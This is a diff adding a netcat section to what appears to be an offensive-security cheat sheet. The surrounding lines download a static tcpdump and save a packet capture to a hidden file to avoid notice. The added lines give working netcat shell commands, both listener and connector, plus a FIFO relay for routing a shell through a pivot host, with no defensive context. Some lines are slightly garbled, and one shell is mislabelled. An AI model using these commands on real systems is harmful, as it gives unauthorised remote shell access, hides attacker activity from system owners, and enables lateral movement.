@@ -9,3 +9,22 @@ wget -q https://raw.githubusercontent.com/yunchih/static-binaries/master/tcpdump
 ./tcpdump -D
 ./tcpdump -n -i eth0 -s 0 -w .packets.pcap #. - hidden file, slightly less obvious
 =======================================================================
+
+--# NETCAT #--
+#reverse shell
+listener:
+nc -l -p <port> -e /bin/sh cmd.exe  #depending on OS
+
+connector:
+nc <listenrip> <listenerport>
+
+#netcat relay
+#linux
+#target
+nc -l -p <tgtport> -e cmd.exe
+#relay ost
+mknod relay1 p #p - FIFO obj
+nc -l -p <relayport> 0<relay1 | nc <tgtip> <tgtport> 1>relay1
+#originating client endpoint
+nc <relayip> <relayport>
+#routing reverse shell through relay host
